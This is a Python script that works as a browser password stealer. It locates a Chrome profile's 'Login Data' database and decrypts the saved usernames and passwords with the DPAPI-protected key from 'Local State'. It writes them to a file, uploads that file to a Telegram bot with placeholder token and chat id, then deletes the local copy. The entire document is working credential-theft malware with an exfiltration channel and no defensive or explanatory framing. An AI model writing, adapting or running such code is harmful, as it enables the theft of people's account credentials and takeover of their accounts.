import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
from telegram import Bot, InputFile
import asyncio

async def send_to_telegram(file_path, bot_token, chat_id):
    bot = Bot(token=bot_token)
    with open(file_path, 'rb') as file:
        await bot.send_document(chat_id=chat_id, document=InputFile(file))

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

async def main():
    profile_names = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4"]

    for profile_name in profile_names:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", profile_name, "Login Data")

        if os.path.exists(db_path):
            break

    try:
        key = get_encryption_key()

        if not os.path.exists(db_path):
            print("No valid profile found.")
            return

        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()

        current_datetime = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        output_filename = f"login_data_{current_datetime}.txt"

        with open(output_filename, 'w') as file:
            cursor.execute(
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                if username or password:
                    login_data = f"Origin URL: {origin_url} \n" \
                                 f"Action URL: {action_url} \n" \
                                 f"Username: {username}\n" \
                                 f"Password: {password}\n"
                    file.write(login_data)
                else:
                    continue

        cursor.close()
        db.close()

        # Change BOT_TOKEN and CHAT_ID to your 
        bot_token = 'BOT_TOKEN'
        chat_id = 'CHAT_ID'

        # Use loop.run_until_complete to run the coroutine in the main thread
        loop = asyncio.get_event_loop()
        await send_to_telegram(output_filename, bot_token, chat_id)

        os.remove(output_filename)

        print(f"Login data sent to Telegram and removed from desktop for profile '{profile_name}'.")

    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
